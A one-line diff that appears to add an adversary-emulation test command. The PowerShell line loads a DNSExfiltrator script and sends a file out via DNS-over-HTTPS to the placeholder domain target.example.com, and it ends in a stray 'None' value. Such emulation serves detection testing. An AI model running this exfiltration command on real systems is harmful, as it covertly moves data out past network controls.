@@ -1,0 +1,1 @@
+Import-Module "PathToAtomicsFolder\..\ExternalPayloads\dnsexfil.ps1"; Invoke-DNSExfiltrator -i "PathToAtomicsFolder\..\ExternalPayloads\dnsexfil.ps1" -d target.example.com -p atomic -doh google -t 500 None
